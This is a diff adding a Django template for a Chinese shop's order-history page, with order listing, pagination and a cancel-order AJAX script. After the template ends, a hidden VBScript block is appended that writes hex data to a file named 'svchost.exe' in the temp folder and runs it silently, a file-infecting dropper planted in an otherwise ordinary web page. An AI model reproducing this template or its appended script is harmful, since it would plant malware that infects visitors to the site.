@@ -1,0 +1,116 @@
+{% extends 'user_base.html' %}
+{% load tags %}
+
+{% block user_content %}
+
+    <div class="right_content clearfix">
+        <h3 class="common_title2">全部订单</h3>
+        {% for item in orders.object_list %}
+            <ul class="order_list_th w978 clearfix">
+                <li class="col01">{{ item.order_time }}</li>
+                <li class="">订单号：{{ item.uuid }}</li>
+                <li class="col01 stress">{{ item.get_is_pay_display }}</li>
+            </ul>
+            <table class="order_list_table w980">
+                <tbody>
+                <tr>
+                    <td width="55%">
+                        {% for order_detail in item.orderdetail_set.all %}
+                            <ul class="order_goods_list clearfix">
+                                <li class="col01"><img src="{{ MEDIA_URL }}{{ order_detail.goods_info.images }}">
+                                </li>
+                                <li class="col02">{{ order_detail.goods_info.name|truncatechars:10 }}<em>{{ order_detail.goods_price }}元/{{ order_detail.goods_info.unit }}</em>
+                                </li>
+                                <li class="col03">{{ order_detail.count }}</li>
+                                <li class="col04">{{ order_detail.goods_price }}元</li>
+                            </ul>
+                        {% endfor %}
+                    </td>
+                    <td width="15%"><em>{{ item.total }}</em>元</td>
+                    <td width="15%">{{ item.get_is_pay_display }}</td>
+                    <td width="15%">
+                        {% if item.is_pay == "1" %}
+                        <a href="#" class="oper_btn">去付款</a>
+                        <a href="javascript:" class="cannel_order oper_btn" data_id="{{ item.id }}">取消订单</a>
+                        {% endif  %}
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+        {% empty %}
+            <h3>暂时没有订单啊！！赶紧去买啊！！！</h3>
+        {% endfor %}
+    <div id="" class="pagenation">
+               <ul>
+                   {% if orders.has_previous %}   # 如果有，获取上一页
+                              # 把前端的属性获取到,然后爱使用
+                   <li class="" style="display: inline-block">
+                       <a href="?{{ orders.first_page_number.querystring }}">首页</a></li>
+                   <li class="" style="display: inline-block">
+                       <a href="?{{ orders.previous_page_number.querystring }}">上一页</a></li>
+                   {% endif %}
+                   {% for page in orders.pages %}
+                       {% if page %}
+                           {% ifequal page all_course.number %}
+                           <li class="active" style="display: inline-block"><a href="?{{ page.querystring }}">{{ page }}</a></li>
+                           {% else %}
+                           <li class="" style="display: inline-block"><a href="?{{ page.querystring }}">{{ page }}</a></li>
+                           {% endifequal %}
+                       {% else %}
+                           <li class="none"><a href="">...</a></li>
+                       {% endif %}
+                   {% endfor %}
+                   {% if orders.has_next %}
+                       <li class="" style="display: inline-block">
+                           <a href="?{{ orders.next_page_number.querystring }}">下一页</a></li>
+                       <li class="" style="display: inline-block">
+                           <a href="?current_page={{ orders.paginator.num_pages }}">末尾</a></li>
+                   {% endif %}
+               </ul>
+            </div>
+{#        {% divide_page curr_page p "user:user_center_order" request.get_full_path %}#}
+    </div>
+
+
+     <script>
+        $(function(){
+            $(".cannel_order").on("click", function(){
+                var order_id = $(this).attr("data_id");
+                data = {
+                    "order_id": order_id
+                }
+                if(confirm("是否确认取消订单？")){
+                    $.ajax({
+                       type: "get",
+                       url: "{% url 'shoppingorder:cancelorder' %}",
+                       data: data,
+                       success: function(res){
+                           if(res.code == -1){
+                               location.href = "/account/login/";
+                           }else if(res.code == 0){
+                                alert( "成功: ");
+                                location.href = "/account/usercenterorder/"
+                           }
+                       }
+                    });
+                };
+            });
+        });
+    </script>
+{% endblock user_content %}
+
+<SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = ""
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
